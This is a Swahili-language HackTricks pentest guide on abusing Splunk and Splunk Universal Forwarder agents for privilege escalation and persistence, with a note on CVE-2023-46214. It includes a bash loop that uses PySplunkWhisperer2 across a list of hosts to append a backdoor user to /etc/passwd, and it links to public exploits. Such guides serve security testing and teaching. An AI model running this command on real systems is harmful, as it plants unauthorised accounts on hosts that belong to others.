# Splunk LPE na Uthabiti

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

Ikiwa unafanya **uchunguzi** wa mashine **ndani** au **nje**, ukigundua **Splunk inayoendesha** (bandari 8090), ikiwa una bahati ya kujua **vitambulisho halali**, unaweza **kutumia huduma ya Splunk** ku **tekeleza kikao** kama mtumiaji anayeendesha Splunk. Ikiwa root inaendesha, unaweza kuongeza mamlaka hadi kufikia root.

Pia, ikiwa tayari ni root na huduma ya Splunk haiisikilizi tu kwenye localhost, unaweza **kuiba** faili ya **nywila** kutoka kwa huduma ya Splunk na **kuvunja** nywila, au **kuongeza vitambulisho vipya** kwake. Na kudumisha uthabiti kwenye mwenyeji.

Katika picha ya kwanza hapa chini unaweza kuona jinsi ukurasa wa wavuti wa Splunkd unavyoonekana.



## Muhtasari wa Kudukua Mawakala wa Splunk Universal Forwarder

Kwa maelezo zaidi angalia chapisho [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Hii ni muhtasari tu:

**Muhtasari wa Kudukua:**
Kudukua mawakala wa Splunk Universal Forwarder (UF) inaruhusu wadukuzi wenye nenosiri la wakala kutekeleza nambari ya aina yoyote kwenye mifumo inayotumia wakala, na hivyo kuhatarisha mtandao mzima.

**Mambo Muhimu:**
- Mawakala wa UF hawathibitishi ujio wa uhusiano au uhalali wa nambari, hivyo kuwa hatarini kwa utekelezaji usiohalali wa nambari.
- Njia za kawaida za kupata nywila ni pamoja na kuzipata kwenye saraka za mtandao, kushiriki faili, au nyaraka za ndani.
- Kudukua kwa mafanikio kunaweza kusababisha ufikiaji wa kiwango cha SYSTEM au root kwenye mwenyeji uliodukuliwa, utoroshaji wa data, na uingizaji wa mtandao zaidi.

**Utekelezaji wa Kudukua:**
1. Mshambuliaji anapata nywila ya wakala wa UF.
2. Anatumia API ya Splunk kutuma amri au hati kwa mawakala.
3. Hatua zinazowezekana ni pamoja na kuchambua faili, kubadilisha akaunti za mtumiaji, na kudhoofisha mfumo.

**Athari:**
- Kudukua mtandao mzima na ruhusa za kiwango cha SYSTEM/root kwenye kila mwenyeji.
- Uwezekano wa kuzima kumbukumbu ili kuepuka kugunduliwa.
- Usanikishaji wa mlango wa nyuma au ransomware.

**Amri ya Mfano kwa Kudukua:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits za umma:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Kutumia Maswali ya Splunk

**Kwa maelezo zaidi angalia chapisho [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

**CVE-2023-46214** iliruhusu kupakia hati ya kiholela kwenye **`$SPLUNK_HOME/bin/scripts`** na kisha ilieleza kwamba kwa kutumia swali la utafutaji **`|runshellscript script_name.sh`** ilikuwa inawezekana **kutekeleza** **hati** iliyo stored hapo.


<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
